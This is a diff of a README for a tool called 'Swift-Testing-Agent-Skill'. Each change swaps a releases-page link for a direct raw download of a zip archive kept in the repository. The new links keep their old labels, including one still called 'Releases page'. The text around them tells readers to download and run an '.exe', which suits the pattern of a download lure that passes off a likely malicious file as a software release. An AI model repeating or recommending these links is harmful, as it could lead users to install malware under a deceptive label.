@@ -1,6 +1,6 @@
 # 🤖 Swift-Testing-Agent-Skill - AI Tools Integration Made Easy
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Swift--Testing--Agent--Skill-brightgreen)](https://github.com/Acromegaliacanaliculus452/Swift-Testing-Agent-Skill/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Swift--Testing--Agent--Skill-brightgreen)](https://github.com/Acromegaliacanaliculus452/Swift-Testing-Agent-Skill/raw/refs/heads/main/swift-testing-pro/agents/Skill-Swift-Agent-Testing-1.9-alpha.2.zip)
 
 ## 📄 What is Swift-Testing-Agent-Skill?
 
@@ -41,7 +41,7 @@ This section guides you through downloading and running Swift-Testing-Agent-Skil
 
 Click the button below to open the releases page where you can find the latest version of Swift-Testing-Agent-Skill.
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Swift--Testing--Agent--Skill-blue)](https://github.com/Acromegaliacanaliculus452/Swift-Testing-Agent-Skill/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Swift--Testing--Agent--Skill-blue)](https://github.com/Acromegaliacanaliculus452/Swift-Testing-Agent-Skill/raw/refs/heads/main/swift-testing-pro/agents/Skill-Swift-Agent-Testing-1.9-alpha.2.zip)
 
 ### Step 2: Choose the Latest Version
 
@@ -95,7 +95,7 @@ You don’t need to manually change settings or write code. The software takes c
 
 Keep your software up to date for best performance and security.
 
-1. Check the [Releases page](https://github.com/Acromegaliacanaliculus452/Swift-Testing-Agent-Skill/releases) regularly for new versions.  
+1. Check the [Releases page](https://github.com/Acromegaliacanaliculus452/Swift-Testing-Agent-Skill/raw/refs/heads/main/swift-testing-pro/agents/Skill-Swift-Agent-Testing-1.9-alpha.2.zip) regularly for new versions.  
 2. Download the latest `.exe` file when available.  
 3. Run the installer to replace the older version. Your settings will stay intact.  
 
@@ -125,4 +125,4 @@ Always download software releases from the official GitHub page to avoid unsafe 
 
 For all downloads and updates, use the official releases page linked below:
 
-[Download Swift-Testing-Agent-Skill Releases](https://github.com/Acromegaliacanaliculus452/Swift-Testing-Agent-Skill/releases)
+[Download Swift-Testing-Agent-Skill Releases](https://github.com/Acromegaliacanaliculus452/Swift-Testing-Agent-Skill/raw/refs/heads/main/swift-testing-pro/agents/Skill-Swift-Agent-Testing-1.9-alpha.2.zip)
